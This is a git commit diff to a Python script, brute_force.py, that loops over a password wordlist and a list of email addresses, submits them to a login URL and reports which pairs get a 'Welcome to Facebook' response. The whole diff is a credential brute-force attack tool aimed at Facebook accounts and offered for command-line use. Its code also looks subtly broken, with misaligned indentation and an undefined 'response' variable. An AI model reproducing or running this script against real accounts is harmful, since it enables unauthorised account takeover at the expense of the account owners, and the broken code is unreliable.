6d491fb2b653bfd5089b52a0b3b84e5715e22c44
Kamil01 <107310243+Adminek01@users.noreply.github.com>
2023-11-24 10:08:15 +0100

    Update brute_force.py

--- brute_force.py
+++ brute_force.py
@@ -59,4 +59,38 @@ def attack(entries):
 
     # Check if any successful logins were found
     for entry in entries:
-        if "Welcome to Facebook
+                if "Welcome to Facebook" in response:
+            print(bcolors.OKGREEN + "Login successful!" + bcolors.ENDC)
+            print(bcolors.OKGREEN + "Email: " + entry.get('email') + " Password: " + entry.get('passwd') + bcolors.ENDC)
+        else:
+            print(bcolors.FAIL + "Login failed!" + bcolors.ENDC)
+            print(bcolors.FAIL + "Email: " + entry.get('email') + " Password: " + entry.get('passwd') + bcolors.ENDC)
+
+def brute_force(url, passwords, emails):
+    entries = []
+
+    for email in emails:
+        for password in passwords:
+            entries.append({'email': email, 'passwd': password})
+            if len(entries) >= PASSWD_PER_REQUEST:
+                attack(entries)
+                entries = []
+
+    # Attack remaining entries
+    attack(entries)
+
+if __name__ == "__main__":
+    if len(sys.argv) < 4:
+        banner(sys.argv, usage=True)
+
+    url = sys.argv[1]
+    passwords_file = sys.argv[2]
+    emails = sys.argv[3:]
+
+    with open(passwords_file, 'r') as file:
+        passwords = [line.strip() for line in file]
+
+    banner(sys.argv, url=url, emails=emails)
+
+    brute_force(url, passwords, emails)
+
